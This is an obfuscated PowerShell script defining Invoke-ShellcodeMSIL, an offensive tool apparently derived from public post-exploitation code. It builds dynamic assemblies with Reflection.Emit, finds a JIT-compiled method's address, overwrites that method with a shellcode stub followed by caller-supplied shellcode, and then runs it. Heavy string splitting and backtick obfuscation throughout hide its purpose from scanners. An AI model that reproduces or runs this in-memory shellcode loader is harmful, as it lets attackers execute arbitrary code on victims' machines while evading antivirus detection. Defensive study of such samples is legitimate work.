 SeT-vaRiABLE  ('w'+'7g')  (  [tYPE]("{0}{1}{2}"-f'Ap','P','doMain')  ) ;   SEt  u3wtqj  ([typE]("{6}{9}{3}{8}{7}{2}{5}{0}{4}{1}"-F'a','sS','buildE','MIT.AS','cce','r','SYSTEM.RE','EMBLY','s','FlEctION.e')  )  ;  seT-iteM  ('Va'+'ri'+'abLE'+':9Ha'+'xO0') (  [tyPe]("{5}{2}{0}{3}{1}{6}{7}{4}" -F '.Ref','IOn.T','STEm','leCt','Utes','Sy','Y','PeAttrib')  );   SET-vARiablE  ("F"+"K0")  (  [TyPE]("{1}{4}{3}{6}{5}{0}{2}"-F 'ut','sy','es','Tem.R','S','DatTRIB','eFLEcTiON.methO')  ) ;    sET-VAriABLE  ('Kfv'+'x')  ([Type]("{6}{8}{1}{0}{5}{2}{7}{3}{4}" -f 'RE','.','.','opCo','deS','fLecTiON','sYS','EMIT.','tEm')  )  ;   ${8`XQ`2W}  =[tYPE]("{2}{0}{1}"-F'TP','tR','IN') ;    ${n`B3`zy} = [tyPe]("{1}{4}{0}{5}{3}{6}{2}"-F'E','rUnTi','arSHAL','iNTero','m','.','pSerVIces.M')  ;  function InvOK`E-sHe`lL`c`ODe`MsIl
{


    [CmdletBinding()] Param (
        [Parameter( maNdAtoRY = ${t`Rue} )]
        [ValidateNotNullOrEmpty()]
        [Byte[]]
        ${s`h`ELLcODE}
    )

    function G`ET-MeTH`ODAdDR`EsS
    {
        [CmdletBinding()] Param (
            [Parameter(mANDaToRY = ${tR`Ue}, valueFROMpiPeLinE = ${t`RUE})]
            [System.Reflection.MethodInfo]
            ${ME`THodi`N`Fo}
        )

        if (${mEThOd`in`Fo}."mE`ThOd`imp`lEmeNT`ATio`Nfl`AgS" -eq ("{1}{0}{2}" -f 'terna','In','lCall'))
        {
            &("{3}{4}{1}{2}{0}" -f'ing','ar','n','Wri','te-W') "$($MethodInfo.Name) is an InternalCall method. These methods always point to the same address. "
        }

        try { ${Ty`pe} = [MethodLeaker] } catch [Management.Automation.RuntimeException] 
        {
            if (  (GET-vaRIabLE 8xQ2w  -VAlUeoN  )::"S`ize" -eq 4) { ${R`e`T`UrNtype} = [UInt32] } else { ${reT`UrnT`ype} = [UInt64] }

            ${do`MaIN} =   ${w`7G}::"CurreNT`DO`MaiN"
            ${dY`NASsEM`B`LY} = &("{0}{2}{1}" -f 'New-','t','Objec') ("{2}{5}{1}{4}{6}{0}{3}" -f'N','c','Sys','ame','tion.Assemb','tem.Refle','ly')(("{0}{2}{1}{3}"-f'Method','akAssembl','Le','y'))
            
            ${asseMBlYb`Uil`d`er} = ${dO`m`AIN}.("{3}{4}{1}{0}{2}" -f 'embl','Ass','y','DefineDyna','mic').Invoke(${d`YNA`S`sEmblY},  ${u`3wt`Qj}::"r`Un")
            ${MOdULE`BU`i`lDer} = ${A`SsE`mB`lyBuIl`D`er}.("{3}{0}{2}{1}" -f'ami','ule','cMod','DefineDyn').Invoke(("{1}{3}{2}{0}"-f'kModule','Me','ea','thodL'))
            ${T`yp`eBUILDeR} = ${Modu`LEbu`ildER}.("{0}{3}{2}{1}"-f'Defi','ype','T','ne').Invoke(("{3}{1}{2}{0}" -f'ker','e','a','MethodL'),  ( gET-VArIaBLe  9HaXO0)."vA`lue"::"P`UBl`Ic")
            
            ${mETHOdbUI`L`dEr} = ${TYPeBuI`LD`ER}.("{0}{2}{1}" -f 'D','ineMethod','ef').Invoke(("{1}{2}{0}" -f'od','L','eakMeth'),  (  vARIaBlE  ("fk"+"0"))."v`ALUe"::"p`U`BLIC" -bOr  (  Gci ("vaRIaB"+"LE:f"+"K"+"0"))."vaL`UE"::"ST`A`TIc", ${R`etur`NTYPe}, ${N`ULl})
            ${G`en`EratOr} = ${meTh`Odb`UiL`D`ER}.("{1}{0}{2}"-f'o','GetILGenerat','r').Invoke()

            
            ${G`enera`Tor}.("{1}{0}"-f 't','Emi').Invoke(  ( Get-ITem VArIABLE:Kfvx  )."val`UE"::"Ld`Ftn", ${M`E`ThOdINFo})
            ${gENE`RAT`or}.("{0}{1}"-f'E','mit').Invoke(  (GEt-VariaBlE ('KFV'+'x')  -val  )::"R`et")

            
            ${t`YpE} = ${tyPEb`Ui`L`Der}.("{0}{2}{1}" -f 'C','Type','reate').Invoke()
        }

        ${me`TH`od} = ${tY`Pe}.("{2}{1}{0}"-f'd','Metho','Get').Invoke(("{2}{0}{3}{1}" -f 'akMeth','d','Le','o'))

        try
        {
            
            ${A`D`DREsS} = ${M`ET`HoD}."InVo`kE"(${Nu`Ll}, @())

            &("{0}{2}{1}"-f 'Write','ut','-Outp') (&("{0}{1}{2}" -f 'New-','O','bject') ("{1}{0}{2}"-f'tP','In','tr') -ArgumentList ${a`dDr`eSs})
        }
        catch [System.Management.Automation.MethodInvocationException]
        {
            &("{0}{2}{1}"-f'Wr','or','ite-Err') "$($MethodInfo.Name) cannot return an unmanaged address. "
        }
    }


    try { ${SM`ASheR`T`ype} =  [MethodSmasher] } catch [Management.Automation.RuntimeException] 
    {
        ${doM`A`In} =   (geT-vARiaBLE W7g  -ValU  )::"cURR`En`TDoMAin"
        ${D`YNasSem`BLY} = &("{1}{0}{2}"-f'Ob','New-','ject') ("{0}{8}{2}{5}{4}{7}{3}{1}{6}" -f'Sy','blyN','.Reflect','m','n.Ass','io','ame','e','stem')(("{1}{0}{3}{2}" -f 'thod','Me','her','Smas'))
        ${ASSEmb`LYbU`I`LDER} = ${do`M`AIn}.("{0}{4}{1}{2}{5}{3}" -f'Define','am','icAssem','ly','Dyn','b').Invoke(${d`yNaSse`mBly},  ${u`3wT`QJ}::"R`UN")
        ${A`Tt} = &("{2}{0}{1}"-f'-Ob','ject','New') ("{1}{8}{7}{4}{11}{2}{9}{0}{5}{6}{3}{13}{10}{12}" -f'artial','Sys','rity.Al','ust','.','l','yTr','m','te','lowP','ri','Secu','bute','edCallersAtt')
        ${C`o`NStrUCt`Or} = ${A`TT}.("{1}{0}"-f 'etType','G').Invoke().("{2}{3}{0}{4}{1}" -f'r','s','G','etConst','uctor').Invoke()[0]
        ${o`B`Ject`ARraY} = &("{2}{1}{0}" -f 'ject','ew-Ob','N') ("{2}{0}{4}{3}{1}"-f 'em.O',']','Syst','ect[','bj')(0)
        ${ATT`Ri`BBuIlDEr} = .("{0}{2}{1}" -f 'New-O','t','bjec') ("{5}{2}{4}{6}{3}{7}{1}{0}"-f'er','ild','ystem','n.E','.R','S','eflectio','mit.CustomAttributeBu')(${cO`NStru`cT`OR}, ${obje`ct`Arr`Ay})
        ${ASSe`M`BL`ybU`IlDeR}.("{2}{3}{1}{0}" -f 'ribute','stomAtt','Set','Cu').Invoke(${AttRIB`BUIl`der})
        ${MOd`UL`e`BUi`LDER} = ${aSS`E`MbL`YBuiLD`er}.("{2}{4}{0}{3}{1}{5}"-f'fineDynami','du','D','cMo','e','le').Invoke(("{1}{4}{3}{0}{2}"-f'ash','Meth','er','Sm','od'))
        ${m`ODaTt} = .("{0}{1}{2}"-f 'New-','Obj','ect') ("{6}{3}{10}{0}{5}{8}{9}{7}{4}{11}{12}{2}{1}"-f'ty.U','ute','rib','m.Sec','d','n','Syste','bleCo','ve','rifia','uri','eA','tt')
        ${cOns`TRuC`T`Or} = ${m`ODa`TT}.("{0}{1}" -f'GetTy','pe').Invoke().("{2}{1}{0}"-f 's','uctor','GetConstr').Invoke()[0]
        ${oB`je`CtA`RRay} = &("{1}{2}{0}"-f 'ect','N','ew-Obj') ("{0}{4}{1}{2}{3}"-f 'Sy','.','Object','[]','stem')(0)
        ${mO`D`Attri`BbUildER} = &("{0}{3}{1}{2}" -f 'New-O','j','ect','b') ("{7}{4}{9}{8}{2}{3}{0}{5}{6}{1}"-f'.Custom','uteBuilder','m','it','.','A','ttrib','System','on.E','Reflecti')(${c`onsTr`U`CtoR}, ${ObJec`TAr`RAy})
        ${MOD`ULEBU`I`LD`eR}.("{0}{2}{1}{5}{3}{4}"-f'SetCustomA','t','t','ut','e','rib').Invoke(${M`OdaT`TRiBb`UI`LDEr})
        ${tyP`Eb`UILDEr} = ${Mo`Dul`EbU`ILDer}.("{1}{2}{0}" -f 'eType','D','efin').Invoke(("{1}{3}{2}{4}{0}" -f'sher','M','od','eth','Sma'),  ( GeT-varIaBlE  ('9Ha'+'Xo'+'0') )."v`AlUe"::"p`Ublic")
        ${parA`Ms} = .("{1}{2}{0}" -f'ject','New-','Ob') ("{3}{0}{1}{2}{4}" -f'y','st','em.Ty','S','pe[]')(3)
        ${pa`Ra`Ms}[0] = [IntPtr]
        ${pA`R`AMS}[1] = [IntPtr]
        ${pAr`Ams}[2] = [Int32]
        ${mEtH`oDBuIL`DEr} = ${t`ype`BUil`deR}.("{2}{1}{0}" -f 'hod','neMet','Defi').Invoke(("{0}{2}{3}{1}" -f'O','teMethod','verw','ri'),   ( GeT-Variable  Fk0 )."V`ALUE"::"P`U`BLiC" -bOr   ${F`K0}::"STa`T`IC", ${n`UlL}, ${PAr`AMS})
        ${gE`NERa`ToR} = ${M`Et`H`odBUildeR}.("{2}{0}{3}{1}" -f 'ILG','ator','Get','ener').Invoke()
        
        
        ${g`E`NeRatOr}.("{0}{1}"-f 'Emi','t').Invoke(  ${kF`VX}::"lD`A`Rg_0")
        ${gE`NEr`ATor}.("{1}{0}" -f 't','Emi').Invoke(  ( gEt-Item VaRiAbLe:KFvx)."V`AluE"::"L`DaR`G_1")
        ${Ge`NERAt`oR}.("{0}{1}"-f'Em','it').Invoke(  ${KF`VX}::"lDa`R`G_2")
        ${g`EnE`R`AToR}.("{0}{1}" -f'Emi','t').Invoke( (  get-ITEM  varIabLE:kFVX )."v`ALUe"::"voL`ATi`le")
        ${gENer`A`ToR}.("{1}{0}" -f't','Emi').Invoke(  ${Kf`VX}::"CP`BlK")
        ${GEn`Era`ToR}.("{1}{0}"-f 'it','Em').Invoke(  ${K`Fvx}::"r`eT")

        ${SmaSh`erTy`pe} = ${tYP`e`BUI`LDEr}.("{2}{3}{1}{0}" -f 'e','yp','Cr','eateT').Invoke()
    }

    ${OVE`RWrIT`EMeT`H`OD} = ${s`MaS`hErtY`pe}.("{0}{1}{2}"-f'Ge','tMet','hod').Invoke(("{0}{1}{2}{3}" -f'Overw','rit','eMe','thod'))



    try { ${T`yPE} = [SmashMe] } catch [Management.Automation.RuntimeException] 
    {
        ${dom`AIn} =  ${W`7g}::"CurRe`N`TdOmAIn"
        ${DYNASSe`MB`LY} = &("{2}{0}{1}"-f'w','-Object','Ne') ("{3}{5}{4}{2}{1}{0}"-f 'lyName','ion.Assemb','ect','S','tem.Refl','ys')(("{0}{2}{1}" -f 'Smas','e','hM'))
        ${aSseMB`lY`B`UiLD`ER} = ${do`MA`In}.("{1}{4}{2}{5}{0}{3}"-f 'mb','De','A','ly','fineDynamic','sse').Invoke(${DY`NA`SS`EMBLY},  (  GI  VArIaBLE:U3wtqj  )."v`AlUE"::"R`UN")
        ${A`TT} = .("{3}{1}{2}{0}" -f 'bject','-','O','New') ("{4}{12}{10}{3}{2}{0}{1}{13}{9}{11}{5}{7}{8}{6}{15}{14}" -f 'Par','tia','ow','l','S','rustedCallers','ib','At','tr','l','.Al','yT','ystem.Security','l','te','u')
        ${Cons`TR`UC`Tor} = ${a`Tt}.("{1}{2}{0}"-f 'ype','G','etT').Invoke().("{3}{1}{2}{0}"-f 'ors','etConstr','uct','G').Invoke()[0]
        ${O`BjeC`T`ARRAY} = .("{1}{0}{2}" -f 'e','New-Obj','ct') ("{3}{0}{2}{1}" -f'm','ect[]','.Obj','Syste')(0)
        ${AtTRi`B`Buil`d`eR} = .("{0}{2}{1}{3}"-f'New-','c','Obje','t') ("{5}{8}{3}{2}{10}{9}{1}{11}{6}{4}{7}{0}"-f'r','tomA','t','.Reflec','ibu','Syste','tr','teBuilde','m','t.Cus','ion.Emi','t')(${CoNST`R`UcTOr}, ${ObJ`ecTArr`AY})
        ${aSsemBL`Y`B`U`iLdeR}.("{0}{3}{2}{1}" -f'SetC','tribute','t','ustomA').Invoke(${a`TTrIB`BuIlD`ER})
        ${moDu`LEBUi`l`D`er} = ${AS`SemB`lYbuI`lD`er}.("{4}{2}{3}{1}{0}" -f'le','odu','fineDynami','cM','De').Invoke(("{1}{0}"-f 'ashMe','Sm'))
        ${mO`DA`Tt} = .("{1}{2}{3}{0}" -f 'ject','Ne','w','-Ob') ("{6}{2}{1}{7}{5}{0}{4}{3}"-f'de','Unv','rity.','te','Attribu','rifiableCo','System.Secu','e')
        ${CoNst`R`Uc`Tor} = ${moD`ATt}.("{0}{2}{1}" -f'Ge','e','tTyp').Invoke().("{3}{0}{1}{2}" -f 'u','c','tors','GetConstr').Invoke()[0]
        ${o`BJ`EC`TarrAy} = &("{1}{2}{0}"-f'bject','Ne','w-O') ("{1}{3}{4}{2}{0}" -f'ct[]','S','bje','y','stem.O')(0)
        ${M`oD`ATTR`IbBUI`LdeR} = .("{1}{2}{0}"-f'Object','N','ew-') ("{1}{6}{9}{2}{7}{4}{0}{5}{8}{3}"-f 'teBu','Sy','m.Reflec','er','mAttribu','il','s','tion.Emit.Custo','d','te')(${con`s`TRUC`TOR}, ${obJEc`T`Arr`Ay})
        ${mo`d`ULeb`UIldEr}.("{3}{0}{2}{1}{4}"-f 'tCus','m','to','Se','Attribute').Invoke(${MoD`Attri`BbUi`lD`er})
        ${TyPeB`U`I`lDER} = ${MOd`ULeBU`ILdeR}.("{2}{3}{1}{0}" -f 'e','eTyp','De','fin').Invoke(("{0}{2}{1}" -f'Sma','hMe','s'),  (ItEM  ('vA'+'ri'+'ABLe'+':9HA'+'Xo0') )."VaL`Ue"::"P`UBLIc")
        ${para`Ms} = .("{2}{3}{0}{1}" -f 'jec','t','Ne','w-Ob') ("{1}{2}{0}" -f'Type[]','Sy','stem.')(1)
        ${p`ARAmS}[0] = [Int]
        ${M`E`Th`odb`UILDER} = ${tyPebU`Il`D`eR}.("{3}{1}{0}{2}" -f 'n','i','eMethod','Def').Invoke(("{2}{0}{1}{3}"-f'er','writeM','Ov','e'),  (  get-CHildITEm VARiaBlE:fK0)."Va`LUe"::"PUb`L`IC" -bOr  ( Get-vaRIAble ("f"+"K0") -vAlUeo  )::"sT`A`TIc", [Int], ${pa`RAMS})
        ${GeNe`R`AtOr} = ${metHO`DB`UILdeR}.("{2}{1}{3}{0}"-f'ator','ILG','Get','ener').Invoke()
        ${X`oRval`Ue} = 0x41424344
        ${G`eNeRA`TOr}."D`eCLAr`Elo`caL"([Int]) | .("{0}{1}"-f 'Ou','t-Null')
        ${g`eN`eRaTOr}.("{1}{0}" -f'it','Em').Invoke(  ( vaRIABlE kFvx  -VA  )::"LdAR`g`_0")
        
        
        
        foreach (${c`ode`B`loCk} in 1..100)
        {
            ${GeNerA`T`OR}.("{0}{1}"-f'E','mit').Invoke(  ${K`FVx}::"ldc`_`i4", ${X`OrVAl`UE})
            ${Ge`Ne`Ra`Tor}.("{1}{0}"-f 't','Emi').Invoke( (ChiLDiTem vAriablE:KFVx )."Va`LUe"::"x`Or")
            ${ge`N`ErATOR}.("{0}{1}"-f'Emi','t').Invoke( (  gCI VaRIaBLe:kfVx)."v`ALUE"::"sTlo`c_0")
            ${G`ENER`AtOR}.("{1}{0}" -f 't','Emi').Invoke( (  VarIAbLE  KFVX -valUeo  )::"lD`lo`c_0")
            ${xOrv`A`l`Ue}++
        }
        ${gENEr`AT`or}.("{0}{1}" -f'Em','it').Invoke(  ${k`FVX}::"LD`c_I4", ${xor`VaL`Ue})
        ${ge`Ne`RATOr}.("{1}{0}" -f't','Emi').Invoke( ( get-CHiLditeM vARIabLE:kfVx  )."vAL`Ue"::"X`oR")
        ${gE`NeR`AT`oR}.("{0}{1}"-f'E','mit').Invoke(  (Dir ("vArIa"+"B"+"l"+"e:kfvX")  )."VaL`Ue"::"R`eT")
        ${ty`Pe} = ${tyPE`BU`ILD`er}.("{0}{1}{2}"-f'Crea','te','Type').Invoke()
    }

    ${tArgeT`met`HoD} = ${Ty`pE}.("{0}{1}{2}{3}" -f 'G','et','Me','thod').Invoke(("{3}{0}{2}{1}"-f'write','e','M','Over'))


    
    .("{3}{0}{2}{1}"-f'erb','se','o','Write-V') ("{2}{5}{10}{3}{8}{1}{6}{9}{7}{4}{0}"-f 'ITed...','h','Forcing','et m','be J',' t','od t',' ','et','o','arg')

    foreach (${ex`eC} in 1..20)
    {
        ${tA`R`geTMETHod}."INV`o`kE"(${nu`Ll}, @(0x11112222)) | &("{1}{2}{0}"-f'l','Out-Nu','l')
    }

    if (  ( VariABlE  ('8xq2'+'W') -VAlUEONly )::"si`Ze" -eq 4 )
    {
        
        ${FI`N`AlsHeLlco`dE} = [Byte[]] @(0x60,0xE8,0x04,0,0,0,0x61,0x31,0xC0,0xC3)
        

        .("{2}{0}{1}" -f 'bos','e','Write-Ver') ("{5}{1}{0}{2}{4}{3}" -f'6 ','ng x8','s','de...','hellco','Prepari')
    }
    else
    {
        
        ${F`IN`AlsHelLco`dE} = [Byte[]] @(0x41,0x54,0x41,0x55,0x41,0x56,0x41,0x57,
                                     0x55,0xE8,0x0D,0x00,0x00,0x00,0x5D,0x41,
                                     0x5F,0x41,0x5E,0x41,0x5D,0x41,0x5C,0x48,
                                     0x31,0xC0,0xC3)
        

        &("{3}{0}{1}{2}"-f 'er','bos','e','Write-V') ("{4}{0}{7}{5}{3}{1}{2}{6}{8}" -f'eparin','hel','lco','4 s','Pr','_6','d','g x86','e...')
    }

    
    ${Final`s`hELlCodE} += ${shE`LlCO`de}

    
    ${sH`EllCOdeA`dd`R`eSs} =   ( gEt-vaRIABLe NB3ZY  -valUeoN )::("{1}{2}{0}" -f 'al','AllocH','Glob').Invoke(${FInALS`H`ElLc`OdE}."lEng`TH")

    .("{1}{2}{0}"-f'ose','W','rite-Verb') "Allocated shellcode at 0x$($ShellcodeAddress.ToString("X$([IntPtr]::Size*2)")). "

    
    
      ( VariAbLe  ('nb3z'+'Y')  )."Va`Lue"::("{0}{1}"-f 'Cop','y').Invoke(${fin`AL`S`HElL`cODE}, 0, ${sheL`lC`ODEa`dDreSS}, ${fIn`AL`s`HElL`CODE}."LENG`TH")

    ${taRG`Et`Me`Th`Od`ADDre`SS} = [IntPtr] (&("{1}{0}{3}{2}" -f '-Method','Get','dress','Ad') ${tAR`GEtm`EtH`oD})

    &("{2}{3}{1}{0}"-f'Verbose','te-','Wr','i') "Address of the method to be overwritten: 0x$($TargetMethodAddress.ToString("X$([IntPtr]::Size*2)")) "
    &("{3}{2}{0}{1}"-f 'e-Verbo','se','rit','W') ("{7}{12}{1}{10}{4}{8}{3}{0}{5}{2}{11}{6}{9}"-f'he shell','iting ','e','with t','met','cod','.','Overw','hod ','.','dummy ','.','r')

    ${ArgU`ME`N`Ts} = &("{0}{1}{3}{2}"-f 'N','ew-Obj','t','ec') ("{0}{2}{1}" -f'Ob',']','ject[')(3)
    ${argU`m`e`Nts}[0] = ${ta`RGETmETH`od`ADdREss}
    ${A`R`gUmen`TS}[1] = ${She`L`lcoDeAd`drESS}
    ${A`RGUm`Ents}[2] = ${Fi`NalSH`E`lLCOdE}."l`En`gth"

    
    ${OVeRwRi`T`eM`etH`Od}."In`Vo`kE"(${Nu`ll}, ${ARg`UMEN`Ts})

    &("{3}{2}{0}{1}"-f 's','e','ite-Verbo','Wr') ("{4}{1}{3}{2}{0}" -f '.','ing s','code..','hell','Execut')

    
    ${SHe`l`LCODe`Ret`U`RnvaLUe} = ${t`A`RG`EtmEt`HOd}."I`NvOke"(${Nu`Ll}, @(0x11112222))

    if (${sHel`lcod`erEtUR`Nv`ALuE} -eq 0)
    {
        &("{0}{1}{2}{3}"-f'Wri','te-Ver','bo','se') ("{2}{9}{0}{1}{5}{3}{6}{7}{8}{4}" -f'co','d','She','cute','!','e exe','d succ','essf','ully','ll')
    }
}